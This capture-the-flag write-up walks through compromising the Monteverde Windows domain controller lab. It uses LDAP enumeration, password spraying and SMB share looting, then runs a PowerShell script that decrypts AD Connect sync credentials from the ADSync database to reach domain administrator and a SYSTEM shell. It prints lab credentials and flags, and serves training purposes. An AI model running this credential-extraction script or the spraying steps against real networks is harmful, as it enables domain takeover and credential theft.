
## CTF Writeup: Monteverde

---
## Reconnaissance

An detailed portscan revealed the following information about running services on the target system.

```
nmap -n -Pn -sSCV -p- -oA nmap/Monteverde 10.129.228.111  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-23 13:04 -0500
Nmap scan report for 10.129.228.111
Host is up (0.018s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-23 18:07:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: -2s
| smb2-time: 
|   date: 2026-07-23T18:08:39
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 278.04 seconds
```

The target seems to be an Domain Controller and we get information about the FQDN "MONTEVERDE.MEGABANK.LOCAL", information about the initial domain "MEGABANK.LOCAL" and the Hostname "MONTEVERDE". Let's map them all to the target ip address in our local dns file.

```
echo "10.129.228.111 MONTEVERDE.MEGABANK.LOCAL MEGABANK.LOCAL MONTEVERDE" | tee -a /etc/hosts
```

Enumerated LDAP with ldapsearch unauthenticated and stored server response inside an .txt file on my local machine.

```
ldapsearch -x -H ldap://10.129.228.111 -b "dc=megabank,dc=local" > ldapsearch.txt
```

I grep'd for "userPrincipalName".

```
cat ldapsearch.txt | grep userPrincipalName
```

Stored the output in an users.txt wordlist on my local machine.

Tried ASREP-Roasting, but no user has NoPreAuth set.

```
impacket-GetNPUsers -dc-ip 10.129.228.111 megabank.local/ -no-pass -usersfile users.txt
```

Since I didn't know how to proceed, I tried to spray all usernames with password equals there username and found out that user "SABatchJobs" has the same password as his username.

```
SABatchJobs:SABatchJobs
```

Enumerated SMB Shares and found 4 non-default SMB Shares. We have read permissions to the users$ SMB Share.

```
nxc smb megabank.local -u SABatchJobs -p SABatchJobs --shares
```

Enumerated Domain Users and stored them in an newusers.txt file on my local machine

```
nxc smb megabank.local -u SABatchJobs -p SABatchJobs --rid-brute > newusers.txt
```

Formatted the wordlist properly and stored it inside an users.txt file on my local machine.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

I decided to check out the users$ SMB Share.

```
smbclient \\\\megabank.local/users$ -U SABatchJobs
```

Downloaded all information onto my local machine.

```
recurse ON
prompt OFF
mget *
```

In mhope's users directory I was able to find an interesting "azure.xml" file. I provided me with an Password.

```
4n0therD4y@n0th3r$
```

Added it to my passwords.txt file on my local machine and sprayed again using nxc.

```
nxc smb megabank.local -u users.txt -p passwords.txt --continue-on-success
```

We now have valid credentials for user "mhope".

Upon inspecting shares as user mhope, we realise that we now seem to have read permissions to "azure_uploads" SMB Share!

```
nxc smb megabank.local -u mhope -p '4n0therD4y@n0th3r$' --shares
```

Checked out if we can connect as user mhope to the Domain Controller, yes we can!

```
nxc winrm megabank.local -u mhope -p '4n0therD4y@n0th3r$'
```

But before doing so, let's check out the SMB Share. It seems to be empty.

Let's download Domain Information with bloodhound-python remotely.

```
bloodhound-python -u mhope -p '4n0therD4y@n0th3r$' -ns 10.129.228.111 -d megabank.local -c all
```

Started up my bloodhound on my local machine.

```
neo4j console
bloodhound
```

Connected to the target server via evil-winrm as user "mhope".

```
evil-winrm -i megabank.local -u mhope -p '4n0therD4y@n0th3r$'
```

Retrieved user.txt in C:\Users\mhope\Desktop.

```
22b0d0aac08ba9aee5a8a340bd66536e
```
## Privilege Escalation

Enumerated Groups & Permissions of user "mhope" and it seems to be part of "Azure Admins", but other than that I wasn't able to retrieve more information.

Let's upload the downloaded domain information.

I marked SABATCHJOBS & mhope as owned, but couldn't find any way to escalate my privileges.

Proceeded with enumerating the target in our session as user "mhope".

```
net user
```

I continued with enumerating available Applications on the target and there seemed to be a lot of hints to an running SQL Database.

```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Verified that MSSQL seems to be actively running on port 1433

```
netstat -ano
```

Unfortunately it wouldn't let me connect remotely to the MSSQL Database.

```
impacket-mssqlclient megabank.local/mhope:'4n0therD4y@n0th3r$'@megabank.local -windows-auth
```

I also tried it without domain credentials (without the -windows-auth parameter), but it also didn't work.

Since I know from experience that sometimes there is "sqlcmd" installed we can utilize it to enumerate the database from the target itself!

```
sqlcmd -q "SELECT name FROM sys.databases;"
```

There was an non-default Database called "ADSync". Let's check out the tables!

```
sqlcmd -q "SELECT * FROM ADSync.information_schema.tables;"
```

All the tables are listed here:

```
mms_metaverse                                                                    
mms_metaverse_lineageguid                                                        mms_metaverse_lineagedate                                                        mms_connectorspace                                                
mms_cs_object_log                                                                mms_cs_link                                                                      mms_management_agent                                                             mms_synchronization_rule                                                         mms_csmv_link                                                                    mms_metaverse_multivalue                                                         mms_mv_link                                                                      mms_partition                                                                    mms_watermark_history                                                            mms_run_history                                                                  mms_run_profile                                                                  mms_server_configuration                                                         mms_step_history                                                                 mms_step_object_details 
```

I started with enumerating this one, but it didn't provide much.

```
sqlcmd -q "SELECT * FROM ADSync.dbo.mms_management_agent"
```

From this one I gained an encoded password string for the "administrator" user, which I didn't know what to do with. 

```
8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g
```

I enumerated all databases, but couldn't retrieve anything useful. I had to make research and had to look up since this was an very unique privesc combined with local AD & Cloud Azure. 

We previously enumerated AD Sync being active as an Application, but also an SQL Database called "ADSync" in which we got an encoded password string for the Administrator user.

1. Checking out C:\Program Files

Provides us with the information that "AD Connect" is running. 

2. Let's find out the version of AD Connect

According to the Microsoft documentation, the name of the
service responsible for syncing the local AD to Azure AD is ADSync . We don't see a reference to this on running Get-Process , and attempting to run tasklist results in an Access Denied error.
We can also try to enumerate services with the PowerShell cmdlet Get-Service , or by invoking wmic.exe service get name , sc.exe query state= all or net.exe start , but are also denied access. Instead, we can enumerate the service instance using the Registry.

```
Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
```

This reveals that the service binary is C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe (in ImagePath)
We can issue the command below to obtain the file (and product) version

```
Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force
```

Searching online reveals the adconnectdump tool: https://github.com/dirkjanm/adconnectdump, that can be used to extract the password for the AD Connect Sync Account. The repo mentions that the way that AD connect stores credentials changed a while back. The new version stores credentials using DPAPI and the old version used the Registry. The current version of AD Connect at the time of writing is 1.5.30.0 , so the version on the server is unlikely to use DPAPI. This tool works for newer versions of the AD Connect that use DPAPI. Some further searching reveals this blog post: https://blog.xpnsec.com/azuread-connect-for-redteam/, which is recommended reading. It details the exploitation process for the older version of AD Connect. Copy the script from the blog post and save it locally.

I modified the script accordingly, the original one uses a local database on the client variable and saved it locally as "adconnect.ps1".

```
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

Attempting to run this was successful. A default installation of AD Connect uses a SQL Server Express instance as a LocalDB, connecting over a named pipe.

The -s flag in Evil-WinRM allows us to specify a folder containing our malicious powershell script. We can load a script in memory within the Evil-WinRM session by typing the script name and hitting return.

```
evil-winrm -i 10.10.10.172 -u mhope -p "4n0therD4y@n0th3r$" -s /opt/tools
```

This was successful, and we have obtained credentials for the AD Connect Sync account. In this case, as it was a custom install, it seems the primary domain administrator was used for this. It's worth noting that a default installation uses the NT SERVICE\ADSync service account.

Let's use Evil WinRM to connect as the administrator.

In my evil-winrm session I called the script:

```
adconnect.ps1
```

Executed the following commands and gained credentials of the Administrator User!

```
*Evil-WinRM* PS C:\Users\mhope\Documents> Write-Host ("Domain: " + $domain.Domain)
Domain: MEGABANK.LOCAL
*Evil-WinRM* PS C:\Users\mhope\Documents> Write-Host ("Username: " + $username.Username)
Username: administrator
*Evil-WinRM* PS C:\Users\mhope\Documents> Write-Host ("Password: " + $password.Password)
Password: d0m@in4dminyeah!
```

```
administrator:d0m@in4dminyeah!
```

Connected via psexec to the Domain Controller and gained SYSTEM Shell.

```
impacket-psexec Administrator:'d0m@in4dminyeah!'@megabank.local
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
5b537e55d7d6061a180db0cd6a4c6ec7
```